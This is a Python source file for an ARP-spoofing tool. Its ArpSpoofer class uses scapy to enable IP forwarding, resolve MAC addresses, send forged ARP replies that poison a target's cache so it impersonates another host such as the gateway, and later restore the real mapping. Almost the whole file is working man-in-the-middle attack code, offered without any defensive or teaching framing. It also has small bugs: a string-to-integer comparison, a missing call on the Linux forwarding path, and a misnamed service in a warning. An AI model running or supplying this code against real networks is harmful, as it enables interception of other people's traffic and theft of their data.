import pywintypes
import win32serviceutil
from scapy.all import Ether, ARP, srp, send, send
import os
import sys

from logger import Logger

# Initialize logger class
logger = Logger(False)


class ArpSpoofer:
    def __init__(self):
        pass

    def _enable_linux_iproute(self):
        """
        Enables IP route (IP forward) in a Linux-based distro
        """

        file_path = "/proc/sys/net/ipv4/ip_forward"
        with open(file_path) as file:
            if file.read() == 1:
                return

        with open(file_path, "w") as file:
            print(1, file=file)

    def _enable_windows_iproute(self):
        """
        Enables IP route (IP forward) in Windows
        """
        # Enable Remote Access Service
        try:
            win32serviceutil.StartService("RemoteAccess")

        except Exception as E:
            logger.warn("Couldn't start service 'RemoteAddress'. It might be already running...")

    def enable_ip_route(self, verbose: bool = True):
        """
        Enables IP forwading
        """
        if verbose:
            logger.info("Enabling IP Routing...")

        self._enable_windows_iproute() if "nt" in os.name else self._enable_linux_iproute

        if verbose:
            logger.success("IP Routing enabled")

    def get_mac_addr(self, ip: str):
        """ 
        Returns MAC address of any device connected to the network
        If ip is down, returns None instead.

        Args:
            ip ([str]): [The target's IP address]
        """

        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                     ARP(pdst=ip), timeout=3, verbose=0)
        if ans:
            return ans[0][1].src

    def spoof(self, target_ip: str, host_ip: str, verbose: bool = True):
        """    
        Spoofs `target_ip` saying that we are `host_ip`.
        it is accomplished by changing the ARP cache of the target (poisoning)

        Args:
            target_ip (str): [The target's IP address]
            host_ip (str): [The host's IP address]
            verbose (bool, optional): [Print logs]. Defaults to True.
        """

        # Get the mac address of the target
        target_mac = self.get_mac_addr(target_ip)

        # Craft the arp operation packet (ARP response)
        # we don't specify 'hwsrc' (source MAC address)
        # because by default, 'hwsrc' is the real MAC address of the sender (ours)
        arp_response = ARP(pdst=target_ip, hwdst=target_mac,
                           psrc=host_ip, op='is-at')

        # Send the packet
        # verbose = 0 (send packet without printing anything)
        send(arp_response, verbose=0)
        if verbose:
            # get the MAC address of the default interface we are using
            self_mac = ARP().hwsrc
            logger.success(f"Sent to {target_ip} : {host_ip} is-at {self_mac}")

    def restore(self, target_ip, host_ip, verbose: bool = True):
        """ 
        Restores the normal process of a regular network
        This is done by sending the original informations 
        (real IP and MAC of `host_ip` ) to `target_ip`

        Args:
            target_ip ([type]): [The target's IP address]
            host_ip ([type]): [The host's IP address]
            verbose (bool, optional): [Print logs]. Defaults to True.
        """

        # Get the real MAC address of target
        target_mac = self.get_mac_addr(target_ip)
        # Get the real MAC address of spoofed (gateway, i.e router)
        host_mac = self.get_mac_addr(host_ip)

        # Crafting the restoring packet
        arp_response = ARP(pdst=target_ip, hwdst=target_mac,
                           psrc=host_ip, hwsrc=host_mac)

        # Sending the restoring packet
        # To restore the network to its normal process
        # we send each reply seven times for a good measure (count=7)
        send(arp_response, verbose=0, count=7)

        if verbose:
            logger.success(f"Sent to {target_ip} : {host_ip} is-at {host_mac}")
